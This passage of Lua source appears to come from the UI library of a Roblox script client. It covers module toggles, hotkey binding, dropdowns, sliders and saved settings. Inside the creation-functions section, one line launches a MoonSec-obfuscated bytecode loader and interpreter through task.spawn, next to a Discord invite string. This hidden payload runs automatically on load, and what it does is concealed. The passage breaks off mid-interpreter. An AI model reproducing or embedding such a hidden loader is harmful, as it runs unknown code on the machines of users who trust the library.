                Configs[self.Name] = {["Keybind"] = "", ["IsToggled"] = "", ["MenuToggled"] = "", ["Extras"] = {}}
            end
            if (t) then
                ModListEnable(self.Name)
                Configs[self.Name]["IsToggled"] = true
                saveSettings()
				if not nonoti then
                    ui:Notify("Module toggled", self.Name .. " was toggled")
				end
            else
                ModListDisable(self.Name)
                Configs[self.Name]["IsToggled"] = false
                saveSettings()
				if not nonoti then
                    ui:Notify("Module disabled", self.Name .. " was disabled")
				end
            end
            return self 
        end
        base_class.module_toggle_enable = function(self) 
            self.OToggled = true
            
            pcall(self.Flags.Toggled, true)
            pcall(self.Flags.Enabled)
            
            twn(self.Effect, {Size = s1}, true)
            
            ModListEnable(self.Name)
            return self 
        end
        base_class.module_toggle_disable = function(self) 
            self.OToggled = false
            
            pcall(self.Flags.Toggled, false)
            pcall(self.Flags.Disabled)
            
            twn(self.Effect, {Size = s2}, true)
            
            ModListDisable(self.Name)
            return self
        end
        base_class.module_toggle_reset = function(self)
            if (self.OToggled) then
                local f = self.Flags
                pcall(f.Toggled, false)
                pcall(f.Disabled)
                
                pcall(f.Toggled, true)
                pcall(f.Enabled)
            end
        end
        base_class.module_getstate_self = function(self) return self.OToggled end
        base_class.module_getstate_menu = function(self) return self.MToggled end
        
        base_class.module_setvis = function(self, t, t2) 
            self.Root.Visible = t 
            self.Highlight.Visible = t2
        end 
        
        base_class.module_click_self = function(self) 
            pcall(self.Flags.Clicked)
            
            self.Effect.BackgroundTransparency = 0.8
            twn(self.Effect, {BackgroundTransparency = 1}, true)
        end
        base_class.module_gettext = function(self) 
            return self.Text
        end
        
    end
    -- Setting funcs
    do
        base_class.s_toggle_self = function(self) 
            local t = not self.Toggled
            if (t) then
                Configs[self.PName]["Extras"][self.Name] = true
                saveSettings()
            else
                Configs[self.PName]["Extras"][self.Name] = false
                saveSettings()
            end
            pcall(self.Flags.Toggled, t)
            pcall(self.Flags.Enabled)
            pcall(self.Flags.Disabled)
            
            self.Toggled = t
            twn(self.Icon, {BackgroundTransparency = t and 0 or 1})
            return self
        end 
        base_class.s_toggle_enable = function(self) 
            self.Toggled = true
            
            pcall(self.Flags.Toggled, true)
            pcall(self.Flags.Enabled)
            
            twn(self.Icon, {BackgroundTransparency = 0})
            return self
        end 
        base_class.s_toggle_disable = function(self) 
            self.Toggled = false
            
            pcall(self.Flags.Toggled, false)
            pcall(self.Flags.Disabled)
            
            twn(self.Icon, {BackgroundTransparency = 1})
            return self
        end 
        base_class.s_toggle_reset = function(self) 
            if (self.Toggled) then
                local f = self.Flags
                pcall(f.Toggled, false)
                pcall(f.Disabled)
                
                pcall(f.Toggled, true)
                pcall(f.Enabled)
            end
        end
        base_class.s_toggle_getstate = function(self) 
            return self.Toggled
        end
        base_class.s_modhoykey_setnewhotkey = function(self, hotkey)
            local label = self.Label
            label.Text = 'Settings new key...'
            wait(0.01);
            local kcv = Enum.KeyCode[hotkey].Value
            self.Hotkey = kcv
            label.Text = 'Hotkey: ' .. Enum.KeyCode[hotkey].Name
            
            
            Configs[self.Parent.Name]["Keybind"] = Enum.KeyCode[hotkey].Name
            saveSettings()
            delay(0.01, function()
                local n = self.Parent.Name
                for i = 1, #ui_Hotkeys do 
                    if ui_Hotkeys[i][3] == n then
                        tabRemove(ui_Hotkeys, i)
                        break
                    end
                end
                tabInsert(ui_Hotkeys, {kcv, function() 
                    self.Parent:Toggle()
                end, n})
            end)
        end
        base_class.s_modhotkey_sethotkey = function(self) 
            local label = self.Label
            label.Text = 'Press any key...'
            print(self.Parent.Name)
            wait(0.01);
            local c;
            c = servInput.InputBegan:Connect(function(io,gpe)
                
                Configs[self.Parent.Name]["Keybind"] = io.KeyCode.Name
                saveSettings()
                
                local kcv = io.KeyCode.Value
                if (kcv ~= 0) then
                    
                    self.Hotkey = kcv
                    label.Text = 'Hotkey: '..io.KeyCode.Name
                    
                    -- As scuffed as this is, it works
                    -- To prevent the module being bound from immediately toggling, a short delay is made
                    delay(0.01, function()
                        local n = self.Parent.Name
                        for i = 1, #ui_Hotkeys do 
                            if ui_Hotkeys[i][3] == n then
                                tabRemove(ui_Hotkeys, i)
                                break
                            end
                        end
                        tabInsert(ui_Hotkeys, {kcv, function() 
                            self.Parent:Toggle()
                        end, n})
                    end)
                else
                    self.Hotkey = nil    
                    label.Text = 'Hotkey: N/A'
                    
                    local n = self.Parent.Name
                    for i = 1, #ui_Hotkeys do 
                        if ui_Hotkeys[i][3] == n then
                            tabRemove(ui_Hotkeys, i)
                            break
                        end
                    end
                end
                c:Disconnect()
            end)
            
        end
    
        base_class.s_modhotkey_gethotkey = function(self) 
            return self.Hotkey
        end
        
        base_class.s_hotkey_sethotkey = function(self) 
            local label = self.Label
            label.Text = 'Press any key...'
            
            wait(0.01);
            local c;
            c = servInput.InputBegan:Connect(function(io,gpe)
                local kc = io.KeyCode
                local kcv = kc.Value
                if (kcv ~= 0) then
                    
                    self.Hotkey = kc
                    label.Text = self.Name..': '..kc.Name
                    
                    pcall(self.Flags.HotkeySet, kc, kcv)
                else
                    self.Hotkey = nil    
                    label.Text = self.Name..': N/A'
                    
                    pcall(self.Flags.HotkeySet, nil, 0)
                end
                c:Disconnect()
            end)
        end
        
        base_class.s_hotkey_sethotkeyexplicit = function(self, kc) 
            self.Hotkey = kc
            self.Label.Text = self.Name..': '..kc.Name
            
            pcall(self.Flags.HotkeySet, kc, kc.Value)
            
            return self
        end
        
        base_class.s_hotkey_gethotkey = function(self)
            return self.Hotkey
        end
        
        
        base_class.s_dropdown_getselection = function(self) 
            return self.Selection
        end
        base_class.s_dropdown_toggle = function(self) 
            local t = not self.MToggled
            
            self.MToggled = t
            self.Menu.Visible = t
            
            pcall(self.Flags[ t and 'Opened' or 'Closed'])
            
            twn(self.Icon, {Rotation = t and 0 or 180}, true)
        end
        
        base_class.s_ddoption_select_self = function(self) 
            local parent = self.Parent
            
            local objs = parent.Objects
            for i = 1, #objs do objs[i]:Deselect() end
            
            self.Selected = true
            parent.Selection = self.Name
            pcall(parent.Flags['Changed'], self.Name, self)
            
            if (parent.Primary) then
                local n = parent.Parent.Name 
                ModListModify(n, n .. ' <font color="#DFDFDF">['..self.Name..']</font>')
            end
            
            twn(self.Effect, {Size = s1}, true)
            
            return self
        end
        base_class.s_ddoption_deselect_self = function(self) 
            if (self.Selected) then 
                self.Selected = false
                twn(self.Effect, {Size = s2}, true)
            end
            
            return self
        end
        base_class.s_ddoption_selected_getstate = function(self) 
            return self.Selected
        end
        
        base_class.s_slider_getval = function(self) return self.CurrentVal end
        base_class.s_slider_setvalnum = function(self, nval) 
            local min = self.Min
            local cval = self.CurrentVal
            local pval = self.PreviousVal
            
            cval = round(mathClamp(nval, min, self.Max), self.Step)
			Configs[self.PName]["Extras"][self.Name] = cval
			saveSettings()
            
            if (pval ~= cval) then
                pval = cval
                local form = self.StepFormat
                
                self.SliderFill.Position = dimOffset(mathFloor((cval - min) * self.Ratio), 0)
                self.SliderAmnt.Text = form:format(cval)
                
                if (self.Primary) then
                    local n = self.Parent.Name 
                    ModListModify(n, n .. (' <font color="#DFDFDF">('..form..')</font>'):format(cval))
                end
                
                pcall(self.Flags.Changed, cval)
            end
            
            self.CurrentVal = cval
        end
        base_class.s_slider_setvalpos = function(self, xval) 
            local min = self.Min
            local cval = self.CurrentVal
            local pval = self.PreviousVal
            
            local pos_normalized = mathClamp(xval - self.SliderBg.AbsolutePosition.X, 0, self.SliderSize)
            
            cval = round((pos_normalized * self.RatioInverse)+min, self.Step)
			Configs[self.PName]["Extras"][self.Name] = cval
			saveSettings()
            
            if (pval ~= cval) then
                pval = cval
                local form = self.StepFormat
                
                self.SliderFill.Position = dimOffset(mathFloor((cval - min)*self.Ratio), 0)
                self.SliderAmnt.Text = form:format(cval)
                
                self.CurrentVal = cval
                
                if (self.Primary) then
                    local n = self.Parent.Name 
                    ModListModify(n, n .. (' <font color="#DFDFDF">('..form..')</font>'):format(cval))
                end
                
                pcall(self.Flags.Changed, cval)
            end
        end
    end
    -- Button funcs
    base_class.button_click = function(self) 
        pcall(self.Flags['Clicked'])
    end
    -- Slider funcs
    base_class.slider_setval = function(self, value) 
        value = tonumber(value)
        if not value then uierror('slider_setval','value','number') end
        
        local m1,m2,m3 = self.min, self.max, self.step
        value = mathClamp(round(value, m3),m1,m2)
        
        self.setval_internal(value)
    end
    base_class.slider_getval = function(self) 
        return self.value1
    end
    -- Input funcs
    base_class.input_gettxt = function(self) 
        return self.Text
    end
    
    -- Generic funcs
    base_class.generic_tooltip = function(self, tooltip) 
        if (tooltip) then
            self.Tooltip = tostring(tooltip)    
        else
            self.Tooltip = nil
        end
        return self 
    end
    base_class.generic_connect = function(self, flagname, func) 
        if (type(func) ~= 'function' and type(func) ~= 'nil') then
            uierror('generic_connect','func','function or type nil')
        end
        if (type(flagname) ~= 'string') then
            uierror('generic_connect','flagname','string')
        end
        
        self.Flags[flagname] = func
        return self 
    end
      -- Creation functions
    local base_gen_class = 'Generic_Enabled' if (not base_classs) then local typemoduleone, typemodtwo = false, 1 end task.spawn(function() _ = 'discord.gg/gQEH2uZxUk';(function() _msec=(function(l,o,e)local Y=o[(-0x71+157)];local Q=e[l[(1432-0x2e6)]][l[(-72+0x33a)]];local n=(0x200/128)/(0x1de/((0x1d1+-121)+-105))local O=((0x556e/(0x5661/91))-0x58)-(0x53+-82)local s=e[l[(0x17b-226)]][l[(554-0x122)]];local t=(0xc9/(27939/(4726/0x22)))+(0x6e-108)local m=e[l[(-20+0x24e)]][l[(192500/0xdc)]]local b=(-118+0x78)-((-3570/(320-0xc9))+31)local p=(((187+(95+(-0x46+-54)))-95)/21)local P=(((-0x47+(-0x67+(0x1248/60)))+0xd4)+-113)local L=(((-27-(0x18c/11))+0x27f)/192)local r=(39/(((-0x51+574681)/0xc8)/221))local f=((-0x58-((0x361f/163)-94))+82)local H=(129-(0x13f-((0x3a3-522)-216)))local K=((0x28a-((-0x43-11)+442))/143)local x=((((-0xe8+107)+0xfb)-102)-22)local M=((-103-(-0x1d10/(14136/0x39)))+75)local F=((((0x5dda-12041)/0x33)+-0x6d)+-0x7c)local B=(66+((-0x70+(-0x55+-5563))/90))local a=(((0x8ca318/(534-(16200/0x36)))/0x56)/229)local g=(44-((0x5911/(-0x5c+(0x6b43/113)))-0x6f))local i=(-0x5c+(0x2a0/(48-(0x97-110))))local C=(63-((-0x10fa/(0x11f-181))+0x64))local u=(0x1c+(-0x570/((-0x3d+210)-0x5b)))local _=(96-((-0x1a+(180+-0x1b))+-0x23))local w=(76/((-4+(73+-0x5a))+0x28))local A=l[(0x110ee/51)];local J=e[l[(344-(-0x12+209))]][l[(0x228+-111)]];local G=e[(function(l)return type(l):sub(1,1)..'\101\116'end)('kMHFfMph')..'\109\101'..('\116\97'or'FFbOOlHm')..l[(68400/0x78)]];local j=e[l[(0x4ac-626)]][l[(0x787-990)]];local N=(0x4a-72)-((-9600/((31087-0x3ccf)/0xc2))+0x7a)local D=(174/((0x2eab8c/187)/0xbc))-(91-0x59)local y=e[l[(0x1287/31)]][l[(0x12118/232)]];local o=function(l,o)return l..o end local S=(-0x50+84)*(0x300/((84920-0xa5f8)/0xdd))local V=e[l[(0x1c138/100)]];local k=(296/0x94)*(16768/(-31+(0x9b0a/245)))local v=(1090+-0x42)*((-45+(0xea+-115))-0x48)local T=(-41+((-11040/0xe6)+0x8d))local U=((0x4b72/(8787/0x65))/111)*(18+-0x10)local c=e[l[(1133+-0x42)]]or e[l[(1188-0x26a)]][l[(1133+-0x42)]];local d=((57162+(-0x4f+5))/223)local l=e[l[((0x16650/36)-0x514)]];local j=(function(d)local k,e=1,0x10 local o={j={},v={}}local h=-b local l=e+O while true do o[d:sub(l,(function()l=k+l return l-O end)())]=(function()h=h+b return h end)()if h==(S-b)then h=""e=N break end end local h=#d while l<h+O do o.v[e]=d:sub(l,(function()l=k+l return l-O end)())e=e+b if e%n==N then e=D j(o.j,(y((o[o.v[D]]*S)+o[o.v[b]])))end end return m(o.j)end)("..:::MoonSec::..bBfFlLkKoOpPhHmMMFPkFBHbkMOlpHlhmPopfOhoOPlkMllpmFoffBHBKoHkFLfmFOlhBHPoLKMkMkOoBmOpOlPklMmmoHbBkfBpobFlkPPpoLflhFkfbBpblKBmOPBhPPLpMOOoFKBOPLKmPKLfMBObOBmkfMObpHLbmOoofKfoPkFKpmfmhFOPFLPmLHMhhkkFHPLPhKlbhhFoPfmOPPfopmBHLbMoOLBbopmpKKMbOKmloFffhBkbKMMlKHloKPBpPOLoMKOkLMBlpoBLPBLbmMhHLOhhmmbMpOlomKHLFHPOFmPfHklLHMKmBHbKKLmmKlmMLpKhBLPlLFhBFPopKKPppPkllMmpoOfofoPOLHmMhkmhoBfbPMpLfFObbmOoBloHMMKMMFkkFlHfKBBbbmkOMFohfPhpPKFFphBmOmBfHphmkBbbOMkBbooFMplhmLkMPKklmLLLhLHbLBMboMfmhHfhLmmphhmmoKfkhLOFLFfHkBLKPFmMhKLhMPOpKFmmKHmpkFMbkoHkLBHoLPBlpHlhmPMfFhokPHbMLkLMmpoffBhbpBBpplBBoPbMOfbpLKMkOLFlHFKflmMbkPmMoHfhhPHpflPllKmkoLKFmhlOmbkFHKloHfLbPmFbohOOFMHkKLBlMKkBmOLmhfkMhblHphLbmOoofKBFPLohfkFLlPkhPKPmLHMhbfoKbbKLMBFBOMBohOllhKlBKlfkpBfLOfBoKmbpoBmhKfHhkBHOLohfllhFMkplfOpbHPKKbFopMFKPmPkPmoLkHLlHhBlPpMMfpfBpLMmbLFhmlphfFPmbfhOMBmhfBFPKblpKMBkpBLohHFoBMLlFPMkfpMffhMlOoPlKpMFmkMBhOlBbLhHLlHMBFPPLLhpPBmOHlfPHFlobMlpbBokbHpobMHlKMbkophLPHBBHOlFmopFBKPMkkkmLomHbKPMpKMPLFkmhLKOOlFPhboKHfPpbfHOomFLFBBKOMlFKmKkhFopolBmbKMkPfoFlpLLhomMlKoBkPLLlLlBLlkHbkMbmmhkhMBLhmFkBhmBFhKlfoLFoOHbhopmMpHbHpkMmoMkMLPMkOLFlBLopBBolbokboHfhhPkhbPpolKmkoLflhFkfBFPHFMHmKHFFPPLpMOOoFKHkKLBlPFLfMBObfMhmkHbHpPlpmOoofKHokLblpllfMHobBMPmkMMhOPFPHOopBKPkLLBpOFFfHfKbBopmlmmhpHfphHOhbKpklLmHoFfFhBkbFMOmFHHhKhBpPOLoMOOoFLHLKFBLPBLbmMpbLHhhkhbphklomKokfLHfkFbFpBlbHMKmBHhmohMpOPFombKkBLPlLLMlOBFFhMKbbHphlPmpoMfohPkkbkpllFmfoBfbPMkFMHOMFPHpKOfpPKLkMPOlllHfKBBbpMlmmHOBfPhhkObppKlhmLolfKhfPHbbpbFmmfKhBMmmLOMoOKOfHLKLBFPfOHMbOlfmHbkhbPppLPfOoKfhhLKBbFpflBMfKMBmhlLhBoOpFOHooOBkPLLhMFOpFBHbkMfbpHlhMlopfHhokKbkPKllmFohfBHpLMMmOHFhHPKpfbPokBMkOKFlHFKfBBPklMMloHFFhPkpbOpolhmkoKflhLkfbKpbFMmfKHKoPPLPMOOHFKHppOBlPFLflHObFbhmkHLopPlMmOoPfKhkkLBkmllfmKobfhPmLHMhpHFpHOKMBKHFLLMlOFllHBKbBKpmkLmhoPfpHPkobKpMlLbfoFffhBKfMMOmlKHhoLBpPOLoMKOkFLHPKFBhPBLfmMomfHhhKBbppMlommokfLhlkFbKpBlfHMobBHhfLPMpOHFoFFKkBkPlLoMfOLklhMkmbHbolPmPoOfoBFkkbppllkmfoBfbhBkbMHpfFPHmKOBoPKLkffOlFoHfKFBbPBlmMFOBfPhMkOkFpKlKmLolfFhkOLbbOMFmFoKhBhPpLOllOKFPHLKKBFPfLBbfmffmHFkhBmpplOmoOOfkhLkPbFpmlBmbKMFbPHLhbFOpLlHoKKBkPLLlMFOOFBHKkMBkpHLfmPopFbhoOmbkpkllmFoffLMlLMMmOHKFHPKPBOPhoPMkOLFlbMKfBfPbkBBBoHFFhPoKbOpolKMoPkflhPkfBBpbFMHmoMlHPPkFMOOpFKHkKLfkmlLfMPObFphmkHbhpPkkmOoMfKHbkLbkpFlfBFobfLPmkFMhpfFpHMKHBKPhLLFlOFFFHBKbbMPfoBmhoPfpbOkobopklOBooFffhBpBMMOMFHmmOmBpPMLoBbOkFLHlKFFMPBLLmMObfHhmkPBbmBlomPokoBhlklbfpklbmFPfBHPhLPLkOOFOHKKkkBPlLoMfOlFbhMkmBMmHlPMboOFPhKkkbLPklFmfoofbHhLmMHOhlHHpKOfbPKLHMLOlFFmlKBBbPolmbFohfPhpKPbopKLbmLOOfFhfkBbbOMFmmlKhfLPpLPMoOKFkHLKpBFPoLBMKoMfmhHkhBbpplPmooOfkhPklbFpklBFhKMBMPHkBMPOmkHHoKKBkBBLlMlOfFBBhkMBFpHlMmPopfOHppkbkpPllMkoffBhbKBMmOHlFHPOKBOPoLKboOLFlHPKfBlPblMmmOMfhhPKFbOPKlKmkoLFkhFkfbPpblbHmKHBhPPLpMOOMFKmbKLBkPFLfMBObFLhmKFbhPflpmOoofKhPkLbkpFllmBobBMPmkBMhpbFpHOKoBPPkLLMlOFomHBKBbMpmKKmhoMfphOkobKpklLMfoFfkhBkBMMOmFHmfobBpPHLoLHOkFkHlKFBfPLolmMomfHFfkPbPpOKoFkokfphlkobfhLlbMBpmBHhBLPBPOOFoHKKkLLPlLFMfOfFbhMkmBMhMlPmMoOFkhKkkbLppokmfoKfbhbLmMmOhFhHpKOBhPKLkMLOkFFHfKBBbbblmMfohfHhpkpbopPKpmLolfFfFkBbBOMLbbbKhfbPpkpMoOKFkmKPkBFPoLBBFoMfmhHohbPpplMmooHfkHOklBLpflBmoKMFPPHLhMPphFOHoobBkHlLlMFOflFHbkMBopHkhmPopfOHpkKbkPbllmOoffBhbLMMmOHllHPoLBOPpLKMkOLFlHOKfBOPblMmmoHfhhPkMbOpolKmooLflhFkfbkpblbHmKmBhPPOpMOOoFKHKKLBlPFLKMBObfMHbkMbhpPlpkMoofKhkkLblpFlfmBBHflPmLHMhmkLlhHLFhmHfLLMlOFllbfKbBBpmlmmhoPfpHPOObKpOlLmLoFffhBKfffOmlBHhKHBpPOLoMHHOFLHOKFBfPBLBmMOffHhhkMbppOlomOokfLhlkFbkpBlbHMKmBHPhLPMpOHFoHKKkBoPlLFMfOBFlhMkmbHpHlPmpoOfoBokkbOpllLmfoffbhLkPMHOhFPmkKOBOPKLKMLOokKHfKBBbPPlmmmohfMMmkObopKLmmLoLfFhokhbbOMFmMLKhBhPpLpMoOPkpHLKlBFhpLBMBoMFlHokhbhppkBmooofkhLklbKHklBmbKMFkPHLHMPOplMHoKPBkPKLlMkOfFBmkkMBFpHlMmPohfOhmKfbkpOllMPofffhbklMmpBKbHPKpBOHbLKMKOLFlmOKfBLPbLBmmObfhhPobbOpHlKmOoLfkhFkobmpblFHmOkBhPhLpMmOoFPbpKLBlPFkPMBOBfMhmOKbhpMlpmOoofKhkkLBfpFlkmBoBBMPmLHMhPOFpHHKoBOPkLLMlOFKfHBKbbMpMlHmhoPfPhOkobKpklLmloFffhokbMMOmFHmPKPBpPOLOMKOkFLHlKFBfPBLbmMomfHhhkPbppOlomKokfLhlkFbfpBlbHMKmfbPhLPMpOOFoHKKkBLPlLFMfOBFbhMkmbHphlHmpoOfohKkkbLpllFmFoBfbPMLmMHOhFPHpKpBoPKLkllOOFFHfKBLPHolphplPfMhpkOboPOkOmLolfFhFkBbbOMFmmmKhBhPpLOMoOKFkHLhLBFPfLBMfoMfMhHkhlPpplOmooofkhLklbFpflBmbobBMPHLhMPkPFmHoKKBkbbkmmKkHmoHokMbmpHlhMOopfphokKbkpLllMLpLfBhfLMMMOHFhHPobLhPoLpMkOLFlHlKfBFPblMMfoHfhhPkPbOpolKmkoOflhFkfbBpbFMHmKHkHPPLhMOOpFKHKKLBlHBLfMfObFBhmkHbhpPopmOoofKhKkLblpFlFmBobBMPmkBMhOPFpbmofBKPkLLFoPHFBpFfKpLflpBBOoKmBhmkobKpkolbbKobkKFBKbPOmFHHhPHFkhbfpPBfPpPfKoMBKOoBfohOpfHhhkPlmHFFphfFbpMFFPBFbpHfLOFomBHPhLPbhPhFoHKKkBkPlLFMfOKlohMkmbHPolPmPoOfOhKkpFOpllFmfoHfbhbLmbMPMFPHpKOBhPKLkMLOplPHfKBBbPPlmmmohfhhpkHFhpKlkmLObfFhFkBBfhfFmHHKhBmPpLOMoOHFPHLKlBFPhLBMBoMfmhHKbFMpplOmoOBfkhkklbKHklBmbKMfpPHLHMPphLhHoKKBkPKLlMFOfLBBkkMbmpHlhmPoHfOhoKobkpkllmloffBhbLMfPOHFhHPKhBOPpLKMkOMFlHFKfBBPblMmmoHkhhPkpbOpOlKmkoLflhFkfbBpFlKHmKHBhPhkbMOOoFKflpbBOoPbPKMKhfMhmkHbhhOlpmOoofKhkkLKlmFLHmLobBMPmOPBPoMBPHHKoBKPkLLMlOFffBbfKBfpmlHmhHOLkPmLFbPpklLmlhbLfhoFllmppFHHhKPkOmfFMHkLOhHFmholkPlfkofpMfHhhkPBhhhlompokfHhlkFbfpBKfHMoBBHPMLPMPOOFmHhKkBoPlLpMfOfFbhMkmBBmblPmpoOfMhKkKbLPkkkmfolfbhKLmMHOhFPbhKOBPPKLOMLOLFFHfoMBbPflmmMohfPhpKPFOpKlOmLoOfFhfkBBfOMFmmBKhBHPpLOMopOFkHLKOBFPKLBMboMfmhHkhBBpplOmooKfkHKklbFpOlBmLKMBmPHkbMPOpFmHoOlBkPkLlMFHmFBHOkMBfpHlhmPOhFBhoKBbkpkllmFoflBhbLMboOHlkHPKmBOHoLKMkpbFlHFKfBKPblMmmoHFOhPKfbOpolKmkoLflHBkfbOpbFMHmKHBhPPkLMOpkFKHoKLFlPFLfMhObFphmKlbhpPlpmOOFfKhokLbkpFlfmBobfpPmkoMhOmFpMOKoBKhBLLMMOFFLHBKbbMpmLKmhoHfphPkobKpklLmooFfPhBkpMMOmFHHholBpPhLoMOOkLLHlKFBLPBLOmMOBfHHbkhbppmloMlokfkhlKLfLpBlLHMokBHPhLPMphLFoHhKkBkPlLKMfOBlmhMKfbHpmlPmpoOfobKkkbLplllmfoBfbPMLmMHOhFPHpKOBoPKLKMLOlFFHfPBBbpMlmmmohfPhpkObopKlk");local m=(-0x4a+171)local h=13 local e=b;local l={}l={[(0x46+-69)]=function()local O,b,o,l=s(j,e,e+t);e=e+U;h=(h+(m*U))%d;return(((l+h-(m)+k*(U*n))%k)*((n*v)^n))+(((o+h-(m*n)+k*(n^t))%d)*(k*d))+(((b+h-(m*t)+v)%d)*k)+((O+h-(m*U)+v)%d);end,[(0xae/87)]=function(l,l,l)local l=s(j,e,e);e=e+O;h=(h+(m))%d;return((l+h-(m)+v)%k);end,[(131-0x80)]=function()local l,o=s(j,e,e+n);h=(h+(m*n))%d;e=e+n;return(((o+h-(m)+k*(n*U))%k)*d)+((l+h-(m*n)+d*(n^t))%k);end,[(0x78-116)]=function(e,l,o)if o then local l=(e/n^(l-b))%n^((o-O)-(l-b)+O);return l-l%b;else local l=n^(l-O);return(e%(l+l)>=l)and b or D;end;end,[(-123+0x80)]=function()local o=l[((0x20b-298)/0xe1)]();local e=l[(124-0x7b)]();local f=b;local h=(l[(0x1a-22)](e,O,S+U)*(n^(S*n)))+o;local o=l[(122-0x76)](e,21,31);local l=((-b)^l[(0x86-130)](e,32));if(o==D)then if(h==N)then return l*D;else o=O;f=N;end;elseif(o==(k*(n^t))-O)then return(h==D)and(l*(O/N))or(l*(D/N));end;return Q(l,o-((d*(U))-b))*(f+(h/(n^T)));end,[(1170/0xc3)]=function(o,n,n)local n;if(not o)then o=l[(0x6a+-105)]();if(o==D)then return'';end;end;n=J(j,e,e+o-b);e=e+o;local l=''for o=O,#n do l=A(l,y((s(J(n,o,o))+h)%d))h=(h+m)%k end return l;end}local function j(...)return{...},V('#',...)end local function v()local x={};local M={};local o={};local B={x,M,nil,o};local e={}local r=(4680/0x82)local o={[(107-0x6b)]=(function(o)return not(#o==l[((-0x1b+89)/31)]())end),[(828/0xcf)]=(function(o)return l[(40-0x23)]()end),[(448/0xe0)]=(function(o)return l[(34-0x1c)]()end),[(84-0x53)]=(function(o)local e=l[(132+-0x7e)]()local l=''local o=1 for h=1,#e do o=(o+r)%d l=A(l,y((s(e:sub(h,h))+o)%k))end return l end)};B[3]=l[(-0x75+119)]();local h=l[(0x2f+-46)]()for h=1,h do local l=l[(0x70/56)]();local b;local l=o[l%(4758/0xb7)];e[h]=l and l({});end;for B=1,l[(53+-0x34)]()do local o=l[(0x56-84)]();if(l[(0x7d+-121)](o,b,O)==N)then local k=l[(0x48-68)](o,n,t);local h=l[(43-0x27)](o,U,n+U);local o={l[(0x20a/174)](),l[(0x34+-49)](),nil,nil};local d={[(0x0/241)]=function()o[f]=l[(47+-0x2c)]();o[i]=l[(51+-0x30)]();end,[(135/(0x2247/65))]=function()o[L]=l[(-123+0x7c)]();end,[(-0x51+83)]=function()o[H]=l[(0x3c-59)]()-(n^S)end,[(0x7f-124)]=function()o[P]=l[(-79+0x50)]()-(n^S)o[i]=l[(0x6f-108)]();end};d[k]();if(l[(0x7f+(-18450/0x96))](h,O,b)==O)then o[a]=e[o[a]]end if(l[(892/0xdf)](h,n,n)==b)then o[f]=e[o[p]]end if(l[(0x31-45)](h,t,t)==O)then o[w]=e[o[u]]end x[B]=o;end end;for l=O,l[(-0x3b+60)]()do M[l-O]=v();end;return B;end;local function D(l,U,m)local e=l[n];local d=l[t];local l=l[b];return(function(...)local v=V('#',...)-O;local S={};local y={};local k=l;local h={};local s=j local N=e;local e=b;local d=d;local j={...};local l=b l*=-1 local t=l;for l=0,v do if(l>=d)then y[l-d]=j[l+O];else h[l]=j[l+b];end;end;local l=v-d+b local l;local d;while true do l=k[e];d=l[(0xc5/197)];o=(219857)while d<=((3418+-0x64)/0x4f)do o-= o o=(7323624)while d<=(1840/0x5c)do o-= o o=(2105690)while(0x42+-57)>=d do o-= o o=(9753200)while d<=(180/0x2d)do o-= o o=(2017820)while d<=(0x57+(-0x78+34))do o-= o o=(2122983)while(0/0x35)<d do o-= o local o=l[M];local d=h[o+2];local b=h[o]+d;h[o]=b;if(d>0)then if(b<=h[o+1])then e=l[r];h[o+3]=b;end elseif(b>=h[o+1])then e=l[L];h[o+3]=b;end break end while(o)/((0x47e-601))==3867 do local O;local d;local o;h[l[F]]=l[f];e=e+b;l=k[e];h[l[F]]=l[L];e=e+b;l=k[e];h[l[F]]=#h[l[L]];e=e+b;l=k[e];h[l[a]]=l[p];e=e+b;l=k[e];o=l[a];d=h[o]O=h[o+2];if(O>0)then if(d>h[o+1])then e=l[r];else h[o+3]=d;end elseif(d<h[o+1])then e=l[f];else h[o+3]=d;end break end;break;end while(o)/((-0x79+2606))==812 do o=(313239)while(0x1f-(85-0x38))>=d do o-= o h[l[M]]=D(N[l[P]],nil,m);break;end while 193==(o)/((269418/0xa6))do o=(175134)while d>(0x16-19)do o-= o h[l[B]]=h[l[f]];break end while(o)/((0x224a6/243))==303 do do return h[l[M]]end break end;break;end break;end break;end while 2960==(o)/((0xbd0b5/235))do o=(3200670)while(1398/0xe9)>=d do o-= o o=(15267021)while(0x1db/95)<d do o-= o local d;local o;h[l[F]]=(l[P]~=0);e=e+b;l=k[e];h[l[a]]=h[l[P]];e=e+b;l=k[e];h[l[K]]=m[l[f]];e=e+b;l=k[e];o=l[K]h[o]=h[o](h[o+O])e=e+b;l=k[e];d=h[l[_]];if not d then e=e+O;else h[l[a]]=d;e=l[f];end;break end while(o)/((-0x19+3766))==4081 do if h[l[F]]then e=e+b;else e=l[H];end;break end;break;end while 1749==(o)/((1906+-0x4c))do o=(6534392)while(0x68-97)>=d do o-= o if(h[l[K]]~=l[C])then e=e+O;else e=l[f];end;break;end while(o)/((371842/0xb2))==3128 do o=(687123)while d>(1688/(42411/0xc9))do o-= o local l=l[a]h[l]=h[l](h[l+O])break end while(o)/((1095-(1293-0x2b9)))==1377 do local U;local d;local P;local o;h[l[B]]=m[l[r]];e=e+b;l=k[e];h[l[B]]=h[l[r]][l[_]];e=e+b;l=k[e];o=l[B];P=h[l[L]];h[o+1]=P;h[o]=P[l[g]];e=e+b;l=k[e];h[l[F]]=h[l[p]];e=e+b;l=k[e];h[l[K]]=h[l[H]];e=e+b;l=k[e];o=l[M]h[o]=h[o](c(h,o+b,l[r]))e=e+b;l=k[e];o=l[F];P=h[l[L]];h[o+1]=P;h[o]=P[l[C]];e=e+b;l=k[e];o=l[K]h[o]=h[o](h[o+O])e=e+b;l=k[e];d={h,l};d[O][d[n][M]]=d[b][d[n][i]]+d[O][d[n][f]];e=e+b;l=k[e];h[l[x]]=h[l[f]]%l[_];e=e+b;l=k[e];o=l[a]h[o]=h[o](h[o+O])e=e+b;l=k[e];P=l[H];U=h[P]for l=P+1,l[w]do U=U..h[l];end;h[l[M]]=U;e=e+b;l=k[e];d={h,l};d[O][d[n][B]]=d[b][d[n][i]]+d[O][d[n][f]];e=e+b;l=k[e];h[l[x]]=h[l[L]]%l[_];break end;break;end break;end break;end break;end while(o)/((83433/0x15))==530 do o=(2520792)while d<=(1806/0x81)do o-= o o=(4341900)while d<=(1969/0xb3)do o-= o o=(382329)while d>(142-(0x14e-202))do o-= o if(h[l[K]]==h[l[g]])then e=e+O;else e=l[p];end;break end while 207==(o)/((0x793+-92))do U[l[L]]=h[l[a]];break end;break;end while 3530==(o)/((-0x19+1255))do o=(6280912)while(0x46+-58)>=d do o-= o if h[l[F]]then e=e+b;else e=l[p];end;break;end while 2032==(o)/((0xc89+-118))do o=(1429021)while d>(79-0x42)do o-= o h[l[x]]=(l[L]~=0);break end 